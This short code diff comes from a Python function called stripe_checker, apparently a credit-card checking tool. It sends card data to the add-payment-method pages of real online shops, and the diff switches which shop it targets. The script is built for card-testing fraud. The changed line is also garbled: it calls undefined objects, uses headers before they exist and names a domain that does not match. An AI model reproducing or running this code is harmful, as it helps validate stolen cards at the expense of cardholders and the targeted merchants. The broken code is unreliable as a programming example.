@@ -476,8 +476,8 @@ def stripe_checker(ccx):
     if "20" in yy:
         yy = yy.split("20")[1]
     session = requests.Session()
-    base_url = "https://chillinabox.com"
-    add_payment_url = f"{base_url}/my-account/add-payment-method/"
+    base_url = "https://dominileather.com"
+    Mori = losha .get(f'{fgtre}/my-account/add-payment-method/', headers=headers)
     
     headers = {
         'authority': 'www.tacugama.com',
